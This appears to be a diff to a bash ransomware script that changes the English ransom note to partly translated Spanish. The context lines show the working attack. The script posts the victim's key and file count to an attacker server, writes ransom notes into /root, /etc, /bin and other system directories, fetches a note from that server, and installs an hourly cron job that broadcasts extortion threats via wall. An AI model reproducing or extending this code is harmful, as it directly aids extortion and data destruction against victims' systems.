@@ -256,7 +256,7 @@ curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.p
 for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
-    echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+    echo "TUS ARCHIVOS SE HAN ENCRIPTADO CON RSA-4096. Visita la página para desencriptar https://192.168.1.132/decrypt.php and the id ${genKey}. Si no realizas el pago de 48 hours, tus datos se perderan para siempre."
   } >> "${directory}/INSTRUCTIONS.txt"
 
   curl -k https://192.168.1.132/downloads/INSTRUCTIONS.html >> "${directory}/INSTRUCTIONS.html"
@@ -267,7 +267,7 @@ done
   echo -e "\n"
   echo -e "wallCmd=\$(which wall)"
   echo -e "\n"
-  echo -e "echo -e \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\\n\\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE.\" | \${wallCmd}"
+  echo -e "echo -e \"TUS ARCHIVOS SE HAN ENCRIPTADO CON RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\\n\\nIMPORTANT: DO NOT REBOOT YOUR SERVER. DO NOT ATTEMPT RECOVERY WITHOUT PURCHASING OUR DECRYPTION SOFTWARE. IF YOU DO SO, SYSTEM RECOVERY WILL BECOME IMPOSSIBLE.\" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
